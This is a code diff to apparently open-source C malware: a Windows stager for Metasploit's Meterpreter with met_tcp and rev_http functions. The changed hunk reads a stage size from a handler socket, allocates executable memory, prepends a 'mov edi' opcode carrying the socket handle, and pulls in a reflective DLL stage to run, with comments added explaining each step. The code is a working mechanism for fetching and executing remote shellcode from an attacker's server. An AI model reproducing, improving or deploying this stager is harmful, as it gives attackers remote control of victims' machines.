@@ -139,11 +139,19 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 		buffer_socket = sckt;
 	}
 	//////////////////////////////
-	recv(buffer_socket, (char*)&bufSize, 4, 0);
-
+	// When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
+	// So, we read first 4 bytes to use it for memory allocation calculations 
+	recv(buffer_socket, (char*)&bufSize, 4, 0); // read first 4 bytes = stage size
+	
 	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	buf[0] = 0xbf;
-	strncpy((char*)buf + 1, (const char*)&buffer_socket, 4);
+	
+	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
+	// A: the stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
+	//    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
+	//    opcode for "mov edi, imm32" is 0xBF
+
+	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
+	memcpy(buf + 1, &buffer_socket, 4); // got it?
 
 	length = bufSize;
 	while (length != 0){
@@ -166,7 +174,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 
 	// Variables
 	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
-	char FullURL[6] = { 0 };	// FullURL
+	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
 	unsigned char* buffer = nullptr;
 	DWORD flags = 0;
 	int dwSecFlags = 0;
